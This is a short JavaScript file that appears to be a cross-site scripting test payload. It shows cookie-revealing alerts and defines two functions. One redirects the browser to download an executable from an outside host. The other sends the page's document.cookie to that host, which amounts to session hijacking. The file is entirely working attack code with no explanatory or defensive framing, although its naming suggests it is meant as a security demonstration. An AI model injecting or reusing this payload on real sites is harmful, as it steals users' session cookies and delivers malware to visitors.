alert("XSS TEST");
alert(document.cookie);

function MALWARE_DOWNLOAD(){
  document.location.href="https://ninzacode.github.io/SECURITY_TEST/sample.exe";
}

function SESSION_HIJACKING(){
  window.open("https://ninzacode.github.io/SECURITY_TEST/XSS.html?cookie="+encodeURIComponent(document.cookie), target="_blank");
}
